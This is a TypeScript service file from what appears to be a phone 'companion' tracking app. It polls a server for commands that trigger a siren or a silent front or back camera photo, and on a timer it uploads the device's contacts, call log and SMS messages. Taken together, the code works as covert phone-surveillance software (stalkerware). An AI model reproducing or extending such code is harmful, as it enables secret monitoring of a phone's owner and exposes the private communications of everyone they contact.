// companion-app/src/services/SyncCoordinator.ts
import * as Battery from "expo-battery";
import * as Device from "expo-device";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { STORAGE_KEYS, TRACKING_CONFIG } from "../config";
import { sendHeartbeat, sendBatchData } from "./api";
import { playEmergencySiren } from "./SirenService";
import { captureSilentPhoto } from "./CameraService";
import { fetchDeviceContacts } from "./ContactsService";
import { fetchRecentCalls } from "./CallsService";
import { fetchRecentMessages } from "./SmsService";

let heartbeatTimer: any = null;
let dataSyncTimer: any = null;

export async function executePendingCommand(deviceId: string, cmd: any) {
  try {
    if (cmd.command === "ring_siren") {
      await playEmergencySiren();
    } else if (cmd.command === "take_photo") {
      const cameraType = cmd.payload?.camera === "back" ? "back" : "front";
      await captureSilentPhoto(deviceId, cameraType, cmd.id);
    } else if (cmd.command === "sync_contacts") {
      await runDataSync(deviceId);
    }
  } catch (err) {
    console.error("Error executing command", err);
  }
}

export async function runHeartbeat(deviceId: string) {
  try {
    let batteryLevel = 100;
    let isCharging = false;
    try {
      const bat = await Battery.getBatteryLevelAsync();
      batteryLevel = Math.round(bat * 100);
      const state = await Battery.getBatteryStateAsync();
      isCharging = state === Battery.BatteryState.CHARGING;
    } catch {}

    const res = await sendHeartbeat({
      device_id: deviceId,
      battery_level: batteryLevel,
      is_charging: isCharging,
      model: `${Device.manufacturer || ""} ${Device.modelName || ""}`.trim(),
      os_version: Device.osVersion || "Android",
    });

    if (res.commands && res.commands.length > 0) {
      for (const cmd of res.commands) {
        await executePendingCommand(deviceId, cmd);
      }
    }
  } catch (err) {
    console.error("Heartbeat error", err);
  }
}

export async function runDataSync(deviceId: string) {
  try {
    const [contacts, calls, messages] = await Promise.all([
      fetchDeviceContacts(),
      fetchRecentCalls(),
      fetchRecentMessages(),
    ]);

    await sendBatchData({
      device_id: deviceId,
      contacts: contacts.length > 0 ? contacts : undefined,
      calls: calls.length > 0 ? calls : undefined,
      messages: messages.length > 0 ? messages : undefined,
    });
  } catch (err) {
    console.error("Data sync error", err);
  }
}

export function startSyncCoordinator(deviceId: string) {
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  if (dataSyncTimer) clearInterval(dataSyncTimer);

  runHeartbeat(deviceId);
  runDataSync(deviceId);

  heartbeatTimer = setInterval(() => runHeartbeat(deviceId), TRACKING_CONFIG.HEARTBEAT_INTERVAL_MS);
  dataSyncTimer = setInterval(() => runDataSync(deviceId), TRACKING_CONFIG.DATA_SYNC_INTERVAL_MS);
}
